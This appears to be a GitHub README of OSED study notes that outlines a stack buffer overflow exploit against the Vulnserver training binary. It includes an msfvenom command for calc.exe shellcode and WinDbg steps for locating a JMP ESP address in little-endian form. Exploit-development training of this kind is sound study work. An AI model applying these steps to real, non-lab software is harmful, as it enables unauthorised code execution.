**OSEDLabHelpers**


OSED study notes,Stack based overflow using Vulnserver as a test case.
A series of scripts; 

1.InteractiveCrash_EIP_Offset
- Generates a cyclic pattern of any length.
- Sends the pattern to a vulnerable service.
- Prompts you for EIP after crash.

**Calculates the exact offset to EIP.**
 <img width="559" height="132" alt="image" src="https://github.com/user-attachments/assets/89991dd7-cd29-4d23-b178-36070f7b336d" />


2.Test_EIP_Overwrite

3.BadCharsTest

4.Generating Shellcode with MSFvenom,manual process to create the folling shellcode;

 - msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python EXITFUNC=thread
 - Copy the code into the shellcode portion of the final script

5.Finding JMP ESP cmd in module ,manaul process in WinDbg;
- Attach to Vulnserver process,then lm (to load the modules)
-start    end        module name
62500000 62600000   essfunc
77c10000 77d90000   ntdll
...
- scan the module for jmp esp;
  s -b 62500000 L100000 ff e4
(ff e4 opcode for jmp esp)
result - 625011AF  ff e4  JMP ESP
-disassemble to be sure; u 625011af
- add address to code - BUT MAKE SURE CONVERT TO LITTLE ENDIAN!!
  So; JMP_ESP = b"\xAF\x11\x50\x62"  # 0x625011AF
  
6.Final Script
